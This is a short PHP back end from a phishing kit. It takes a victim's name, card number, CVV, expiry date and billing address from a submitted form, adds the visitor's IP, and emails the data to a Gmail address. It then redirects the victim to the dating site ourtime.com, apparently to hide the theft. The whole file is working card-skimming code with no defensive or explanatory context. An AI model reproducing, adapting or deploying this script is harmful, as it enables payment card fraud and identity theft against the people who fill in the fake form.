<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || match! GOD 1ST SON || :------\n";
$message .= "name: ".$_POST['formtext1']."\n";
$message .= "card number: ".$_POST['formtext2']."\n";
$message .= "cvv: ".$_POST['formtext3']."\n";
$message .= "exp month: ".$_POST['formtext4']."\n";
$message .= "exp year: ".$_POST['formtext5']."\n";
$message .= "address: ".$_POST['formtext6']."\n";
$message .= "city: ".$_POST['formtext7']."\n";
$message .= "state: ".$_POST['formtext8']."\n";
$message .= "country: ".$_POST['formtext9']."\n";
$message .= "zip: ".$_POST['formtext10']."\n";
$message .= "----: || THANKS BE TO GOD || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="officemanagementunit@gmail.com";
$subject = "tare | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: http://ourtime.com");
?>
